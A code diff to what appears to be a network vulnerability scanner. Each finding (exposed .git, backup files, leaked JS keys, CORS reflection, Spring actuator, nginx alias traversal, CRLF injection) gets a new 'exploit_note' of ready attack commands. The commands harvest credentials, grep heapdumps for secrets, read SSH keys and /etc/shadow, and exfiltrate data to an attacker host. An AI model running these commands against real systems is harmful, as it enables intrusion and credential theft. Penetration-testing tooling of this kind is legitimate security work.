@@ -1430,12 +1430,14 @@ def crlf_injection_probe(ip: str, port: int, use_tls: bool,
 # ---- Vuln conversion --------------------------------------------------------
 
 def _mk(host_ip: str, port: Port, sid: str, sev: str, title: str,
-        cwes: list[str], output: str, remediation: str) -> Vuln:
+        cwes: list[str], output: str, remediation: str,
+        exploit_note: str = "", depth_tier: str = "") -> Vuln:
     return Vuln(
         ip=host_ip, port=port.portid, protocol=port.protocol,
         script_id=sid, state="finding", title=title, output=output,
         severity=sev, cwes=cwes, source="probe", remediation=remediation,
         confidence="confirmed",
+        exploit_note=exploit_note, depth_tier=depth_tier,
     )
 
 
@@ -1488,6 +1490,13 @@ def enum_findings(host_ip: str, port: Port,
         out.append(_mk(
             host_ip, port, "http-path-enum", h["severity"], title,
             h["cwes"], output, fix,
+            exploit_note=(
+                "curl -sSk http://IP:PORT/.git/HEAD ; for p in .env "
+                ".aws/credentials terraform.tfstate backup.sql wp-config.php; "
+                "do curl -sSk http://IP:PORT/$p | head -60; done ; if "
+                ".git/HEAD present run: git-dumper http://IP:PORT/.git "
+                "/tmp/gitdump && trufflehog filesystem /tmp/gitdump"),
+            depth_tier="t1",
         ))
 
     # Backup-file variants of every disclosed path — often served as static
@@ -1510,7 +1519,11 @@ def enum_findings(host_ip: str, port: Port,
                 f"original path.",
                 "Block *.bak, *.old, *.orig, *~, *.swp, *.backup variants at the "
                 "web-server layer; consider a nginx `location ~* \\.(bak|old|~)$ "
-                "{ deny all; }` rule."))
+                "{ deny all; }` rule.",
+                exploit_note=(
+                    "curl -sSk http://IP:PORT/config.php.bak > /tmp/cfg.bak ; "
+                    "grep -Ei 'password|secret|api_?key|db_' /tmp/cfg.bak"),
+                depth_tier="t1"))
 
     # Directory-listing detection — a 200 on a path with an autoindex response
     # discloses far more than the single-file finding path_enum saw.
@@ -1557,7 +1570,14 @@ def enum_findings(host_ip: str, port: Port,
             ["CWE-798", "CWE-200"] if real_secrets else ["CWE-200"],
             f"{source}: {len(entries)} pattern hit(s) — {', '.join(labels)}\n{snippets}",
             "Never commit secrets to client-side JavaScript. Move authentication "
-            "to a server-side proxy; rotate any exposed key immediately."))
+            "to a server-side proxy; rotate any exposed key immediately.",
+            exploit_note=(
+                "SECRET=$(curl -sSk http://IP:PORT/bundle.js | grep -Eo "
+                "'AKIA[0-9A-Z]{16}|gh[oprs]_[A-Za-z0-9]{36,}|"
+                "sk_live_[A-Za-z0-9]{20,}' | head -1) ; if [[ $SECRET == "
+                "AKIA* ]]; then aws sts get-caller-identity --profile "
+                "leaked ; fi"),
+            depth_tier="t2"))
 
     # Robots + sitemap — free path list from the server itself. Anything they
     # tell us to disallow is exactly what we want to look at. Emit as info
@@ -1649,7 +1669,14 @@ def enum_findings(host_ip: str, port: Port,
             "Access-Control-Allow-Origin echoes 'https://attacker.example' "
             "with Allow-Credentials: true — any origin can read authenticated responses",
             "Restrict Access-Control-Allow-Origin to a fixed allowlist. Never combine "
-            "wildcard/reflection with Allow-Credentials: true."))
+            "wildcard/reflection with Allow-Credentials: true.",
+            exploit_note=(
+                "curl -sSk -H 'Origin: https://attacker.example' -D- "
+                "http://IP:PORT/api/whoami | grep -i access-control ; host on "
+                "evil.example a page that fetch(url,{credentials:'include'})"
+                ".then(r=>r.text()).then(t=>navigator.sendBeacon("
+                "'//attacker/','..'+t))"),
+            depth_tier="t1"))
     elif cors.get("wildcard_with_creds"):
         out.append(_mk(
             host_ip, port, "http-cors-wildcard", "medium",
@@ -1674,7 +1701,13 @@ def enum_findings(host_ip: str, port: Port,
             f"{h['description']}",
             f"Disable the {h['endpoint']} Actuator endpoint (management."
             f"endpoints.web.exposure.exclude={h['endpoint']}) or require "
-            "authentication for /actuator/*."))
+            "authentication for /actuator/*.",
+            exploit_note=(
+                "curl -sSk http://IP:PORT/actuator/env | jq . ; curl -sSk "
+                "-o heap.hprof http://IP:PORT/actuator/heapdump && strings "
+                "heap.hprof | grep -Ei 'password|secret|jdbc:|Bearer ' | "
+                "sort -u | head -80"),
+            depth_tier="t2"))
 
     # Nginx alias-traversal probe (CVE-2018-16843 pattern). One-shot, safe.
     alias = nginx_alias_traversal_probe(host_ip, port.portid, use_tls)
@@ -1689,7 +1722,13 @@ def enum_findings(host_ip: str, port: Port,
             "resolves ABOVE the intended root.",
             "Add a trailing slash to the affected `location` prefix (e.g. "
             "`location /static/ { alias /var/www/static/; }`) OR switch "
-            "`alias` to `root`, which is not affected."))
+            "`alias` to `root`, which is not affected.",
+            exploit_note=(
+                "for p in /root/.ssh/id_rsa /home/ubuntu/.ssh/id_rsa "
+                "/var/www/.env /root/.aws/credentials /etc/shadow; do "
+                "curl -sSk http://IP:PORT/static../$p ; done # if id_rsa "
+                "lands: chmod 600 loot.key; ssh -i loot.key user@target"),
+            depth_tier="t2"))
 
     # Cache-poisoning surface — the reflection is the primitive; the actual
     # cache exploit is fronting-cache dependent, so flag it as medium.
@@ -1759,6 +1798,10 @@ def enum_findings(host_ip: str, port: Port,
             "injection.",
             "Strip \\r and \\n from every value that reaches a response header. "
             "Validate URL parameters against an allowlist and reject on control "
-            "characters at the framework layer."))
+            "characters at the framework layer.",
+            exploit_note=(
+                "curl -sSki 'http://IP:PORT/?x=%0d%0aSet-Cookie:%20"
+                "SESSION=attacker' | grep -i set-cookie"),
+            depth_tier="t1"))
 
     return out
